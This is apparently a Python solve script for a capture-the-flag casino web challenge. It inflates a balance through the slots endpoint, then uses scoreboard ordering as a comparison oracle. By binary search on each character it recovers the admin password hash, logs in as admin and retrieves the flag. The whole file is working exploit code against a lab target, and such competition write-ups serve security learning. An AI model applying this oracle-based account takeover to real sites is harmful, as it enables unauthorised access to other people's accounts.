from hashlib import sha256
from uuid import uuid4
from requests import Session

PASSWORD_ALPHABET = "0123456789abcdef"
PASSWORD_LENGTH = 64

if __name__ == "__main__":
    fullname = "Captain Baccarat"
    username = f"firebird-{uuid4()}"
    print(username)
    password = sha256(
        b"firebird"
    ).hexdigest()  # 57fac8572eeab5fc599c760c659f587e76af9a5fa35b560723772df5f33004bf
    base_url = "https://boilerscasino-19f92d3631a96d90.instancer.b01lersc.tf"

    with Session() as sess:
        with sess.post(
            f"{base_url}/register",
            json={"fullname": fullname, "username": username, "password": password},
        ) as req:
            req.raise_for_status()
        with sess.post(
            f"{base_url}/login", json={"username": username, "password": password}
        ) as req:
            req.raise_for_status()
            jwt = req.json()["jwt"]

        with sess.post(
            f"{base_url}/slots", json={"change": 1000000 - 500}, cookies={"jwt": jwt}
        ) as req:
            req.raise_for_status()

        admin_password = ""
        while len(admin_password) < PASSWORD_LENGTH:
            # the website is a bit slow, use binary search
            letter = ""
            start, end = 0, len(PASSWORD_ALPHABET)
            while start != end:
                mid = (start + end) // 2
                # example: 0-16 -> 0-8 -> 4-8 -> 6-8 -> 6-7 -> 6-6
                letter = PASSWORD_ALPHABET[mid]
                new_password = f"{admin_password}{letter}{PASSWORD_ALPHABET[0] * (PASSWORD_LENGTH - 1 - len(admin_password))}"
                with sess.post(
                    f"{base_url}/update_password",
                    json={"new_password": new_password},
                    cookies={"jwt": jwt},
                ) as req:
                    req.raise_for_status()
                with sess.get(f"{base_url}/scoreboard") as req:
                    req.raise_for_status()
                    text = req.text
                    idx = text.index("The Real Captain Baccarat")
                    try:
                        text.index(
                            "Captain Baccarat", idx + len("The Real Captain Baccarat")
                        )
                    except ValueError:
                        # our hash > their hash
                        end = mid
                    else:
                        # our hash <= their hash
                        if start == mid:
                            break
                        start = mid
            admin_password += letter
            print(admin_password)

        with sess.post(
            f"{base_url}/login", json={"username": "admin", "password": admin_password}
        ) as req:
            req.raise_for_status()
            jwt = req.json()["jwt"]
        print(jwt)

        with sess.post(f"{base_url}/grab_flag", cookies={"jwt": jwt}) as req:
            req.raise_for_status()
            flag = req.json()["flag"]
        print(flag)
